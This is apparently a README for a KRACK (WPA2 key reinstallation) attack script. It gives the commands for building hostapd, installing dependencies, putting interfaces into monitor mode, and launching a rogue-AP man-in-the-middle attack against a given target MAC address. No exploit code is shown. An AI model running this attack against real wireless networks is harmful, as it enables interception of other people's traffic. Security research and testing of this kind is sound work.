This script is currently not actively supported. The documentation is also not complete.

Before running this script, you must compile hostapd. This only needs to be done once:

	  cd ../hostapd
	  cp defconfig .config
	  make -j 2
	  cd ../
	  ./build.sh

Then you can exece this script. See [our video](https://youtu.be/Oh4WURZoR98?t=47) for example commands.

## Prerequisties
intall the following dependencies on Kali Linux:
 ```
$sudo apt update
$sudo apt install libnl-3-dev libnl-genl-3-dev macchanger pkg-config libssl-dev net-tools git sysfsutils pip tcpdump
```
install the following python package:
```
pip install --user mitm_channel_based
pip install scapy==2.4.3
pip install pycryptodome
```

set the nic_rogue_ap, nic_rogue_mon interface to monitor
```
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode Monitor
sudo ifconfig wlan0 up
```

## Description
```
KRAckAttack(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump, args.continuous_csa)
```
- nic_real_mon: nic_real, nic_real_clientack
- nic_rogue_ap: nic_rogue_ap
- nic_rogue_mon: nic_rogue_mon

krack-all-zero-tk.py KRAckAttack class confiure_interfaces()
define wifi interfaces !
1. iw <nic_real> set type monitor
2. <nic_real_clientack> = <nic_real> + sta1
3. iw <nic_real> interface add <nic_real_clientack> type managed

4. (沒特別指定的話) <nic_rogue_mon> = <nic_rogue_ap> + mon
5. iw <nic_rogue_ap> interface add <nic_rogue_mon> type monitor
6. iw <nic_rogue_mon> set type monitor

- nic_real_mon : MERCUSYS MW300UM
- nic_rogue_ap : TP-Link TL-WN722N V2
- nic_rogue_mon: TP-Link AC600

```
python3 ./krack-all-zero-tk.py <nic_real_mon> <nic_rogue_ap> testnetwork --nic-rogue-mon(-m) <nic_rogue_mon> --target(-t) 60:45:cb:01:ce:4c
```

```
sudo ./hostapd hostapd.conf
```